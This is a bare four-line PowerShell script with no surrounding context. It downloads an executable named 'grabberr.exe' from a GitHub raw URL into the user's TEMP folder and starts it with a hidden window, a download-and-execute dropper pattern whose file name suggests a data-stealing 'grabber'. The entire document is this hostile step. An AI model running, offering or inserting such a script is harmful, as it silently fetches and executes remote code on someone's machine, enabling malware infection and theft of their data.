$url = "https://raw.githubusercontent.com/7hbl/grab/main/grabberr.exe"
$path = "$env:TEMP\g.exe"
(New-Object Net.WebClient).DownloadFile($url, $path)
Start-Process $path -WindowStyle Hidden
